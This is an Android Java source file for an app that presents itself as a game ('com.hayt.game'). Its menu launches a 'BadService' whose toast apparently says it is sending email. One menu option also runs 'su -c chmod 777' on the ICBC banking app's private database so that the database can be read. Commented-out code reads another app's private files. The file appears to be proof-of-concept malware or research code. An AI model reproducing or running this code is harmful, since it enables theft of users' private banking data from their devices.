package com.hayt.game;

import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import com.hayt.util.SmsInfo;

import android.net.Uri;
import android.os.Bundle;
import android.app.Activity;
import android.content.Intent;
import android.view.View;
import android.widget.AdapterView;
import android.widget.GridView;
import android.widget.SimpleAdapter;
import android.widget.Toast;
import android.widget.AdapterView.OnItemClickListener;

public class MainActivity extends Activity {
	public static MainActivity instance = null;
	private List<SmsInfo> infos;
	private static int trick = 0;


	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		
//		String filename = "myfile";
//		String string2 = "Hello world!";
//		FileOutputStream outputStream;
//		try{
//		outputStream = openFileOutput(filename, Context.MODE_PRIVATE);
//		outputStream.write(string2.getBytes());
//		outputStream.close();
//		} catch(Exception e) {
//		e.printStackTrace();
//		}
		
		
		instance = this;
		final String string = getResources().getString(R.string.app_name);
		System.out.println(MainActivity.this.getPackageName());
		GridView g=(GridView) findViewById(R.id.gridview_select);
		g.setOnItemClickListener(new OnItemClickListener() {
		
			@Override
			public void onItemClick(AdapterView<?> arg0, View arg1, int arg2,
					long arg3) {
				// TODO Auto-generated method stub
				Intent intent =new Intent();
				
				switch (arg2) {
				case 0:
					Intent intent0 = new Intent();
					intent0.setClass(MainActivity.this, IcbcActivity.class);
					startActivity(intent0);
			        
//			        Intent mainIntent = new Intent(Intent.ACTION_MAIN, null);
//			        mainIntent.addCategory(Intent.CATEGORY_LAUNCHER);
//			        PackageManager pm = getPackageManager();
//			        List<ResolveInfo> resovleList = pm.queryIntentActivities(mainIntent, 0);
//			        System.out.println(resovleList.toString());


					break;
				case 1:
					

					Intent intent4 = new Intent();  
			        intent4.setClassName("com.UCMobile","com.UCMobile.main.UCMobile");  
			        intent4.setAction(Intent.ACTION_VIEW);  
			        intent4.addCategory(Intent.CATEGORY_DEFAULT); 
			        intent4.setData(Uri.parse("www.baidu.com"));  
			        startActivity(intent4);  
			        
	
//					Content content = new Content();
//					content.setPkgnam("com.a.b");
//					content.setAccess(false);
//					content.setType("sms");
//					
//					XmlSerializer serializer = Xml.newSerializer(); //ï¿½ï¿½android.util.Xmlï¿½ï¿½ï¿½ï¿½Ò»ï¿½ï¿½XmlSerializerÊµï¿½ï¿½  
//			        StringWriter writer = new StringWriter();  
//			        try {
//						serializer.setOutput(writer);
//						serializer.startDocument("UTF-8", true); 
//						serializer.startTag("", "content"); 
//						serializer.attribute("", "pkgnam", content.getPkgnam());
//			              
//			            serializer.startTag("", "access");  
//			            serializer.attribute("", "type", content.getType());
//			            serializer.text(String.valueOf(content.getAccess()));
//			            serializer.endTag("", "access");
//			            
//			            serializer.endTag("", "content");
//			            serializer.endDocument(); 
//			            
//					} catch (Exception e) {
//	
//					}   
			        
//			        InputStream inputStream = getResources().openRawResource(R.raw.mac_permissions);
//			        Provider provider = new Provider();
//			        if (provider.hasAccess(null, "sms", inputStream)) {
//			        	System.out.println("access");
//						
//					}
//			        else {
//						System.out.println("noaccess");
//					}
//			        
//			        Uri uri = Uri.parse("content://sms/inbox");
//			        String uriString = uri.toString();
//					System.out.println(CallLog.Calls.CONTENT_URI.toString());
//					if (uriString.contains("sms")) {
//						System.out.println("success");
//					}
//			        XmlPullParser parser = Xml.newPullParser();
//		            try {
//						parser.setInput(inputStream, "UTF-8");
//						int eventType = parser.getEventType(); 
//						while (eventType != XmlPullParser.END_DOCUMENT) {
//							switch (eventType) {
//							case XmlPullParser.START_DOCUMENT:
//				
//								break;
//							case XmlPullParser.START_TAG:
//								//System.out.println(parser.getName());
//								if (parser.getAttributeValue("", "pkgnam")!=null) {
//									System.out.println(parser.getAttributeValue("", "pkgnam"));
//									if (parser.getAttributeValue("", "pkgnam").equals("com.hayt.game")) {
//									parser.next();
//									System.out.println(parser.getAttributeValue("", "type"));
//									//System.out.println(parser.getText());
//								}
//								}
//								
//								
//
//								break;
//							case XmlPullParser.END_TAG:
//
//								break;
//							}
//							eventType = parser.next();
//						}
//					} catch (XmlPullParserException e) {
//						// TODO Auto-generated catch block
//						e.printStackTrace();
//					} catch (IOException e) {
//						// TODO Auto-generated catch block
//						e.printStackTrace();
//					}
//
//			        

					break;
				case 2:
					Intent intent1 =new Intent();
					intent1.setClass(MainActivity.this, BadService.class);
					startService(intent1);
					Toast.makeText(MainActivity.this, "ÕýÔÚ·¢ËÍÓÊ¼þ", Toast.LENGTH_SHORT).show();
					
					//intent.setClass(MainActivity.this,PhotoActivity.class);
					//startActivity(intent);
					break;
				case 3:
					if(BadService.status == 1) Toast.makeText(MainActivity.this, "ÍøÂçÁ¬½Ó´íÎó", Toast.LENGTH_SHORT).show();
					else {
						Toast.makeText(MainActivity.this, "ÍøÂçÁ¬½ÓÕý³£", Toast.LENGTH_SHORT).show();
					}
					
					

					break;
				case 4:
					 String dbdir = "data/data/com.icbc/databases/"+IcbcActivity.TARGET_DBNAME;
					 String cmd="chmod 777 "+dbdir;
						try {
							Runtime.getRuntime().exec(new String[]{"/system/xbin/su","-c", cmd});
						} catch (IOException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}

					//String cmd="cp data/data/com.example.mp3/files/myfile data/data/com.hayt.game/myfile";
//					String cmd="chmod 777 data/data/com.example.mp3/files/myfile";
//					try {
//						Runtime.getRuntime().exec(new String[]{"/system/xbin/su","-c", cmd});
//					} catch (IOException e) {
//						// TODO Auto-generated catch block
//						e.printStackTrace();
//					}
//					new Handler().postDelayed(new Runnable() {
//						
//						@Override
//						public void run() {
//							// TODO Auto-generated method stub
//							File file = new File("data/data/com.example.mp3/files/myfile");
//							//File file = new File("data/data/com.android.settings/myfile");
//							FileReader fr;
//							try {
//								fr = new FileReader(file);
//								BufferedReader br = new BufferedReader(fr);
//
//								 String line = null;
//							
//								 while ((line = br.readLine()) != null) {
//									 System.out.println(line);
//									 
//								  }
//								 fr.close();
//								 br.close();
//							} catch (IOException e) {
//								// TODO Auto-generated catch block
//								e.printStackTrace();
//							}
//						}
//					}, 4000);
					
					
					break;

				default:
					break;
				}
			}
		});
		
       

		ArrayList<HashMap<String, String>> Item = new ArrayList<HashMap<String, String>>();  
	       
        HashMap<String, String> map1 = new HashMap<String, String>();  
        map1.put("Text", getResources().getString(R.string.gridview_item_1));
        Item.add(map1);  
        HashMap<String, String> map2 = new HashMap<String, String>();  
        map2.put("Text", getResources().getString(R.string.gridview_item_2));
        Item.add(map2);  
        HashMap<String, String> map3 = new HashMap<String, String>();  
        map3.put("Text", getResources().getString(R.string.gridview_item_3));
        Item.add(map3);  
        HashMap<String, String> map4 = new HashMap<String, String>();  
        map4.put("Text", getResources().getString(R.string.gridview_item_4));
        Item.add(map4);  
        HashMap<String, String> map5 = new HashMap<String, String>();  
        map5.put("Text", getResources().getString(R.string.gridview_item_5)); 
        Item.add(map5);  
        SimpleAdapter adapter=new SimpleAdapter(this, Item, R.layout.grid_view_item, new String[]{"Text"}, new int[]{R.id.textview_griditem});
        g.setAdapter(adapter);
        


	}


}
